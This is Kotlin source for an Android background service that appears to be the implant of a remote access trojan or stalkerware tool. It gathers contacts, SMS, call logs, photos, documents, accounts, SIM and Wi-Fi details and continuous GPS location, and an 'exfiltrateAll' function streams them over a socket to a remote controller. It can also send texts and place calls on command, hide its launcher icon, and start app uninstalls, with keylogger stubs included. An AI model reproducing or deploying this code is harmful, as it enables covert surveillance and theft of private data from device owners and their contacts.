        val mimeTypes = arrayOf("application/pdf", "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "text/plain", "text/html")
        val selection = mimeTypes.joinToString(" OR ") { "${MediaStore.MediaColumns.MIME_TYPE} = ?" }
        val cursor = contentResolver.query(collection, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.DATE_ADDED, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.RELATIVE_PATH), selection, mimeTypes, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
        var count = 0
        cursor?.use { c ->
            while (c.moveToNext() && count < MAX_RESULTS) {
                try {
                    documents.put(JSONObject().apply {
                        put("id", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)))
                        put("name", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)))
                        put("date", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)) * 1000L)
                        put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
                        put("mimeType", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)))
                        put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)))
                    }); count++
                } catch (e: Exception) { Log.e(TAG, "Error reading document: ${e.message}") }
            }
        }
        return JSONObject().apply { put("documents", documents); put("total", documents.length()) }
    }
    
    private fun sendSms(params: JSONObject): JSONObject {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) { return JSONObject().apply { put("error", "SMS permission not granted") } }
        try {
            val number = params.getString("number"); val message = params.getString("message")
            val smsManagerClass = Class.forName("android.telephony.SmsManager")
            val getDefault = smsManagerClass.getMethod("getDefault"); val smsManager = getDefault.invoke(null)
            val sendTextMessage = smsManagerClass.getMethod("sendTextMessage", String::class.java, String::class.java, String::class.java, android.app.PendingIntent::class.java, android.app.PendingIntent::class.java)
            sendTextMessage.invoke(smsManager, number, null, message, null, null)
            return JSONObject().apply { put("success", true); put("to", number); put("messagePreview", message.take(50)) }
        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun getClipboard(): JSONObject {
        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            JSONObject().apply { put("error", "Clipboard access limited on Android 10+") }
        } else {
            val clip = clipboardManager.primaryClip
            if (clip != null && clip.itemCount > 0) { val text = clip.getItemAt(0).text?.toString() ?: ""; JSONObject().apply { put("text", text); put("length", text.length); put("timestamp", System.currentTimeMillis()) } }
            else { JSONObject().apply { put("text", "") } }
        }
    }
    
    private fun getBatteryInfo(): JSONObject {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return JSONObject().apply {
            put("level", intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0)
            put("scale", intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100)
            put("isCharging", intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == BatteryManager.BATTERY_STATUS_CHARGING || intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == BatteryManager.BATTERY_STATUS_FULL)
            put("plugged", intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0)
            put("temperature", (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0)
            put("voltage", intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0)
            put("health", intent?.getIntExtra(BatteryManager.EXTRA_HEALTH, 0) ?: 0)
            put("technology", intent?.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: "")
        }
    }
    
    private fun getSimInfo(): JSONObject {
        return JSONObject().apply {
            if (ActivityCompat.checkSelfPermission(this@MainService, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                put("simSerial", telephonyManager.simSerialNumber)
                put("subscriberId", telephonyManager.subscriberId?.replace(telephonyManager.subscriberId.substring(0, minOf(6, telephonyManager.subscriberId.length)), "******"))
                put("networkOperator", telephonyManager.networkOperatorName); put("simCountry", telephonyManager.simCountryIso)
                put("simOperator", telephonyManager.simOperatorName); put("simState", telephonyManager.simState)
                put("hasIccCard", telephonyManager.hasIccCard()); put("phoneCount", telephonyManager.phoneCount); put("isNetworkRoaming", telephonyManager.isNetworkRoaming)
            } else { put("error", "Phone state permission not granted") }
        }
    }
    
    private fun getNetworkInfo(): JSONObject {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return JSONObject().apply {
            put("isConnected", networkInfo?.isConnected ?: false)
            put("type", if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) "WiFi" else "Mobile")
            put("typeName", networkInfo?.typeName ?: "Unknown"); put("subtypeName", networkInfo?.subtypeName ?: ""); put("ipAddress", getLocalIpAddress())
            if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                val wifiInfo = wifiManager.connectionInfo; put("ssid", wifiInfo.ssid); put("bssid", wifiInfo.bssid); put("rssi", wifiInfo.rssi); put("frequency", wifiInfo.frequency); put("linkSpeed", wifiInfo.linkSpeed)
            }
        }
    }
    
    private fun hideAppLauncher(): JSONObject {
        try { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP); return JSONObject().apply { put("success", true) } }
        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun unhideAppLauncher(): JSONObject {
        try { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP); return JSONObject().apply { put("success", true) } }
        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun openUrl(params: JSONObject): JSONObject {
        try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(params.getString("url"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); return JSONObject().apply { put("success", true) } }
        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun vibrateDevice(params: JSONObject): JSONObject {
        try {
            val duration = params.optLong("duration", 1000); val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            else @Suppress("DEPRECATION") vibrator.vibrate(duration)
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun makeCall(params: JSONObject): JSONObject {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Call permission not granted") }
        try { startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:${params.getString("number")}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); return JSONObject().apply { put("success", true) } }
        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun startContinuousLocation(): JSONObject {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Location permission not granted") }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, object : LocationListener {
            override fun onLocationChanged(location: Location) {
                try { socket.emit("device:data:bulk", JSONObject().apply { put("location", JSONObject().apply { put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy); put("speed", location.speed); put("bearing", location.bearing); put("timestamp", location.time) }) }) }
                catch (e: Exception) { Log.e(TAG, "Error sending location: ${e.message}") }
            }
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }, Looper.getMainLooper())
        return JSONObject().apply { put("success", true) }
    }
    
    private fun stopContinuousLocation(): JSONObject { locationManager.removeUpdates { true }; return JSONObject().apply { put("success", true) } }
    
    private fun exfiltrateAll(): JSONObject {
        Thread {
            try {
                val allData = JSONObject()
                getContacts()?.let { allData.put("contacts", it) }
                getSmsMessages()?.let { allData.put("sms", it) }
                getCallLogs()?.let { allData.put("callLogs", it) }
                getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
                getInstalledApps()?.let { allData.put("installedApps", it) }
                getCurrentLocation()?.let { allData.put("location", it) }
                getMediaFiles("images")?.let { allData.put("photos", it) }
                getMediaFiles("videos")?.let { allData.put("videos", it) }
                getDocuments()?.let { allData.put("documents", it) }
                getBatteryInfo()?.let { allData.put("battery", it) }
                getSimInfo()?.let { allData.put("simInfo", it) }
                getNetworkInfo()?.let { allData.put("networkInfo", it) }
                getClipboard()?.let { allData.put("clipboard", it) }
                socket.emit("device:data:bulk", allData)
            } catch (e: Exception) { Log.e(TAG, "Exfiltration error: ${e.message}") }
        }.start()
        return JSONObject().apply { put("status", "started") }
    }
    
    private fun startPeriodicDataCollection() {
        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                try {
                    socket.emit("device:ping")
                    socket.emit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) sendBulkData()
                } catch (e: Exception) { Log.e(TAG, "Periodic update error: ${e.message}") }
                Handler(Looper.getMainLooper()).postDelayed(this, 30000)
            }
        }, 30000)
    }
    
    private fun startBatteryMonitoring() { registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) }
    
    private fun registerContentObservers() {
        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
        })
        contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) { getContacts()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
        })
    }
    
    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return ((intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0) * 100.0 / (intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100)).roundToInt()
    }
    
    private fun isCharging(): Boolean {
        val s = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return s == BatteryManager.BATTERY_STATUS_CHARGING || s == BatteryManager.BATTERY_STATUS_FULL
    }
    
    private fun getLocalIpAddress(): String {
        try { val interfaces = NetworkInterface.getNetworkInterfaces(); while (interfaces.hasMoreElements()) { val addresses = interfaces.nextElement().inetAddresses; while (addresses.hasMoreElements()) { val a = addresses.nextElement(); if (!a.isLoopbackAddress && a is java.net.Inet4Address) return a.hostAddress ?: "Unknown" } } } catch (e: Exception) {}; return "Unknown"
    }
    
    private fun getWifiMacAddress(): String { return try { (applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager).connectionInfo.macAddress ?: "02:00:00:00:00:00" } catch (e: Exception) { "02:00:00:00:00:00" } }
    
    private fun getPhoneType(): String { return when (telephonyManager.phoneType) { TelephonyManager.PHONE_TYPE_GSM -> "GSM"; TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"; TelephonyManager.PHONE_TYPE_SIP -> "SIP"; else -> "Unknown" } }
    
    private fun getNetworkType(): String { return when (telephonyManager.dataNetworkType) { TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"; TelephonyManager.NETWORK_TYPE_NR -> "5G"; TelephonyManager.NETWORK_TYPE_UMTS -> "3G"; TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"; TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"; TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"; else -> "Unknown" } }
    
    private fun getNetworkOperator(): String { return telephonyManager.networkOperatorName ?: "Unknown" }
    
    private fun getPhoneTypeLabel(type: Int): String { return when (type) { android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK -> "Callback"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CAR -> "Car"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN -> "Company"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ISDN -> "ISDN"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX -> "Other Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_RADIO -> "Radio"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TELEX -> "Telex"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD -> "TTY/TDD"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER -> "Work Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT -> "Assistant"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MMS -> "MMS"; else -> "Custom: $type" } }
    
    private fun getCallTypeLabel(type: Int): String { return when (type) { CallLog.Calls.INCOMING_TYPE -> "Incoming"; CallLog.Calls.OUTGOING_TYPE -> "Outgoing"; CallLog.Calls.MISSED_TYPE -> "Missed"; CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"; CallLog.Calls.REJECTED_TYPE -> "Rejected"; CallLog.Calls.BLOCKED_TYPE -> "Blocked"; CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"; else -> "Unknown" } }
    
    private fun getNotifications(): JSONObject {
        return JSONObject().apply { put("status", "requires NotificationListenerService"); put("note", "Enable notification access in device settings") }
    }
    
    private fun getWifiNetworks(): JSONObject {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val scanResults = wifiManager.scanResults
            val networks = JSONArray()
            scanResults.forEach { result ->
                networks.put(JSONObject().apply {
                    put("ssid", result.wifiSsid?.toString() ?: "")
                    put("bssid", result.BSSID)
                    put("capabilities", result.capabilities)
                    put("frequency", result.frequency)
                    put("level", result.level)
                    put("timestamp", result.timestamp)
                })
            }
            return JSONObject().apply { put("networks", networks); put("total", networks.length()) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message ?: "Failed to get wifi networks") }
        }
    }
    
    private fun getAccounts(): JSONObject {
        try {
            val accounts = JSONArray()
            val accountManager = getSystemService(Context.ACCOUNT_SERVICE) as android.accounts.AccountManager
            val accountList = accountManager.accounts
            accountList.forEach { account ->
                accounts.put(JSONObject().apply {
                    put("name", account.name)
                    put("type", account.type)
                })
            }
            return JSONObject().apply { put("accounts", accounts); put("total", accounts.length()) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message ?: "Failed to get accounts") }
        }
    }
    
    private fun startKeylogger(): JSONObject {
        return JSONObject().apply { put("status", "keylogger requires accessibility service permission") }
    }
    
    private fun stopKeylogger(): JSONObject {
        return JSONObject().apply { put("status", "keylogger stopped") }
    }
    
    private fun takeScreenshot(): JSONObject {
        return JSONObject().apply { put("status", "screenshot requires MediaProjection API"); put("note", "Not available via simple service") }
    }
    
    private fun uninstallApp(params: JSONObject): JSONObject {
        try {
            val packageName = params.getString("packageName")
            val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            return JSONObject().apply { put("success", true); put("packageName", packageName) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message ?: "Failed to uninstall app") }
        }
    }
}
